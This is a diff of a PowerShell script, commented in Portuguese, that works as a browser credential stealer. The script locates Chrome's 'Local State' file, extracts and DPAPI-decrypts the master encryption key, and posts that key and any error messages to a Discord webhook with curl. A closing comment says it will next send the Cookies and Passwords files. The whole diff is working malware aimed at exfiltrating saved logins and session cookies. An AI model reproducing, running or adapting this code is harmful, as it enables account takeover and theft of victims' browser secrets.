@@ -2,22 +2,29 @@ $u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSY
 Add-Type -AssemblyName System.Security
 
 try {
-    # Define a base do Chrome
     $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    $localStatePath = "$base\Local State"
-
-    # 3. EXTRAÇÃO DA CHAVE
-    $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
-    $encryptedKey = $json.os_crypt.encrypted_key
-    $allBytes = [Convert]::FromBase64String($encryptedKey)
-    $trimmedKey = $allBytes[5..($allBytes.Length - 1)]
-
-    # Descriptografa a chave no contexto do usuário
-    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-    $finalKey = [Convert]::ToBase64String($decryptedKey)
+    # Procura o Local State em todas as subpastas para não ter erro
+    $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1
     
-    # Envia a chave pronta (POST -F resolve o erro de URL malformada)
-    curl.exe -X POST -F "content=🔑 CHAVE_MESTRA_PRONTA: $finalKey" $u
+    $json = Get-Content $ls.FullName -Raw | ConvertFrom-Json
+    $encKey = $json.os_crypt.encrypted_key
+    $bytes = [Convert]::FromBase64String($encKey)
+    $trimmed = $bytes[5..($bytes.Length - 1)]
+
+    Add-Type -AssemblyName System.Security
+    # Forçamos o escopo de usuário de forma bem direta
+    $entropy = $null
+    $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmed, $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    
+    $finalKey = [Convert]::ToBase64String($unprotected)
+    
+    # Se a chave começar com 'DPAPI', algo deu errado na limpeza
+    curl.exe -X POST -F "content=🔑 CHAVE_PRONTA_NOVA: $finalKey" $u
+
+} catch {
+    $erroDetalhado = $_.Exception.Message
+    curl.exe -X POST -F "content=❌ ERRO NA CHAVE: $erroDetalhado" $u
+}
 
     # 4. Envia os arquivos (Cookies e Senhas)
     $paths = @(
